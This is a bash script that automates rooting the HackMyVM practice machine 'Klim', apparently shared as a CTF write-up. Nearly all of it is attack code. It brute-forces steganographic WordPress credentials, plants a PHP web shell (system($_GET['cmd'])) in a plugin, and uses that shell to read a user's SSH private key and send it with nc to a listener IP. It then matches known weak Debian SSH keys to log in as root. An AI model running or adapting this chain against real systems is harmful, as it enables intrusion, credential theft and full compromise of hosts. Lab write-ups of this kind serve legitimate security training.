#This is Writeup/AutoRoot for https://hackmyvm.eu/machines/machine.php?vm=Klim 
#I like to think this is a WP2.0 surely many parts #can be improved and streamlined. 
#Write me for any reason at: 
#baeltd@protonmail.ch                                                                                                                  

echo "                                     G:                                                                                  "
echo "                                     E#,    :           i   t                                                            "
echo "                                     E#t  .GE          LE   Ej            ..       :                                     "
echo "                                     E#t j#K;         L#E   E#,          ,W,     .Et                                     "
echo "                                     E#GK#f          G#W.   E#t         t##,    ,W#t                                     "
echo "                                     E##D.          D#K.    E#t        L###,   j###t                                     "
echo "                                     E##Wi         E#K.     E#t      .E#j##,  G#fE#t                                     "
echo "                                     E#jL#D:     .E#E.      E#t     ;WW; ##,:K#i E#t                                     "
echo "                                     E#t ,K#j   .K#E        E#t    j#E.  ##f#W,  E#t                                     "
echo "                                     E#t   jD  .K#D         E#t  .D#L    ###K:   E#t                                     "
echo "                                     j#t      .W#G          E#t :K#t     ##D.    E#t                                     "
echo "                                      ,;     :W##########Wt E#t ...      #G      ..                                      "
echo "                                             :,,,,,,,,,,,,,.,;.          j                                               "
echo "                                                                                                                         "
echo "                                                                                                                         "
echo "                                      :                   :           :                  :           :                   "
echo "                :                    t#,                 t#,         t#,                t#,         t#,                  "
echo "                Ef                  ;##W.   j.          ;##W.       ;##W.              ;##W.       ;##W.             i   "
echo "             .. E#t     GEEEEEEEL  :#L:WE   EW,        :#L:WE      :#L:WE  GEEEEEEEL  :#L:WE      :#L:WE            LE   "
echo "            ;W, E#t     ,;;L#K;;. .KG  ,#D  E##j      .KG  ,#D    .KG  ,#D ,;;L#K;;. .KG  ,#D    .KG  ,#D          L#E   "
echo "           j##, E#t        t#E    EE    ;#f E###D.    EE    ;#f   EE    ;#f   t#E    EE    ;#f   EE    ;#f        G#W.   "
echo "          G###, E#t fi     t#E   f#.     t#iE#jG#W;  f#.     t#i f#.     t#i  t#E   f#.     t#i f#.     t#i      D#K.    "
echo "        :E####, E#t L#j    t#E   :#G     GK E#t t##f :#G     GK  :#G     GK   t#E   :#G     GK  :#G     GK      E#K.     "
echo "       ;W#DG##, E#t L#L    t#E    ;#L   LW. E#t  :K#E:;#L   LW.   ;#L   LW.   t#E    ;#L   LW.   ;#L   LW.    .E#E.      "
echo "      j###DW##, E#tf#E:    t#E     t#f f#:  E#KDDDD###it#f f#:     t#f f#:    t#E     t#f f#:     t#f f#:    .K#E        "
echo "     G##i,,G##, E###f      t#E      f#D#;   E#f,t#Wi,,, f#D#;       f#D#;     t#E      f#D#;       f#D#;    .K#D         "
echo "   :K#K:   L##, E#K,       t#E       G#t    E#t  ;#W:    G#t         G#t      t#E       G#t         G#t    .W#G          "
echo "  ;##D.    L##, EL          fE        t     DWi   ,KK:    t           t        fE        t           t    :W##########Wt "
echo "  ,,,      .,,  :            :                                                  :                         :,,,,,,,,,,,,,."
echo "V1.0"
echo "Made By B4el7d"

function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }
rm ./klim/id_rsa

if [ -z "$1" ] | [ -z "$2" ]
 	then
		echo "usage: bash ./winsession.sh RHOST LHOST"
		exit 1
	fi
mkdir klim
wget http://$1/wordpress/wp-content/uploads/2021/07/image.jpg -O ./klim/image.jpg
stegbrute --extract-file ./klim/extractBRO --file-name ./klim/image.jpg --threads 50 --wordlist /usr/share/wordlists/rockyou.txt
echo "READING DATA..."
ehiehi=$(cat ./klim/extractBRO | grep "pwd")
data=$(echo $ehiehi | tr "&" "\n")
for req in $data;do
	if [[ $req =~ "pwd" ]] ;then
		echo "WORDPRESS CREDENTIALS:"
		echo "klim:${RED}$(urldecode "$req")${NC}" 
		echo $(urldecode "$req") >> ./klim/passwordWord_press
		echo "-----------------------------------------------"
	fi
done

echo "\n\nAccess to WordPress at link: http://$1/wordpress/wp-login-php                   "
echo "Search PLUGIN SECTION and ADD command below in Holly plugin using Hello.php page    "
echo "COMMAND: 	-----> system(\$_GET['cmd']); <------                                     "
echo "				                                                          "
echo "				                                                          "
echo "				                                                          "
echo "								                          "
echo "!!!!!!!!!!COMPLETE THIS TASK MANUALLY BEFORE CONTINUE RUNNING SCRIPT!!!!!!!!"
echo "!!!!!!!!!!COMPLETE THIS TASK MANUALLY BEFORE CONTINUE RUNNING SCRIPT!!!!!!!!"
read -n 1 -r -s -p $'Press enter to continue...\n'
xterm -e "nc -lnvp 6666 > ./klim/id_rsa" & 
PID=$!
	while ! test -f ./klim/id_rsa ;do
		echo "ready"
		xterm -e "curl http://192.168.56.164/wordpress/wp-content/plugins/hello.php\?cmd\=sudo%20-u%20klim%20/home/klim/tool%20/home/klim/.ssh/id_rsa%20%3E%20/tmp/rsa%20\;%20nc%20-w%203%20192.168.56.194%206666%20%3C%20/tmp/rsa|seep 1"
		echo "reading"
	done
wait $PID
chmod 600 ./klim/id_rsa
scp -i ./klim/id_rsa klim@$1:/opt/id_rsa.pub ./klim
wget https://raw.githubusercontent.com/g0tmi1k/debian-ssh/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 -O ./klim/debKeys2048.tar.bz2
xterm -hold -e "tar -jxvf ./klim/debKeys2048.tar.bz2 -C ./klim/"
MD5=$(echo $(ssh-keygen -E md5 -lf ./klim/id_rsa.pub) | sed -e "s/MD5//" -e "s/2048//" -e "s/://g" -e "s/root@klim (RSA)//" -e 's/ //g')
ls -la ./klim/rsa/2048/ | grep $(echo $MD5)
xterm -hold -e ssh root@$1 -i "./klim/rsa/2048/${MD5}-2005"
echo "HAPPY HACKING ;)"